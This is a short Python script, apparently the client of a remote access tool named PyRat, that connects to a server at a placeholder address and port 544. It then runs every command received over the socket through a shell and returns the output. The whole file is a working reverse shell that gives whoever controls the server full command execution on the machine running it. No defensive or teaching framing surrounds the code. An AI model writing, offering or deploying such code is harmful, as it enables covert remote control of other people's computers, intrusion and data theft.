import os
import socket
import subprocess
import sys

def receiver(s):
    while True:
        cmd_bytes = s.recv(4096) # 4096 is better for heavy transfers!
        cmd = cmd_bytes.decode("utf-8")#utf-8 is a common coding method
        #browse the directory
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$: ")
            continue
        #other cmd commands
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.sendall(data + b"$: ")

#connect to PyRat_Server.py
def connect(address):
    try:
        s = socket.socket()
        s.connect(address)
        print("***********************")
        print("Connection Established.")
        print("***********************")
        print("")
        print(f"Address: {address}")
    except socket.error as error:
        print("Something went wrong... more info below.")
        print(error)
        sys.exit()
    receiver(s)

if __name__ == "__main__":
    host = "Your local ip addres/the ip address where the Pyrat_server.py is located"
    port = 544 #random port
    connect((host, port))
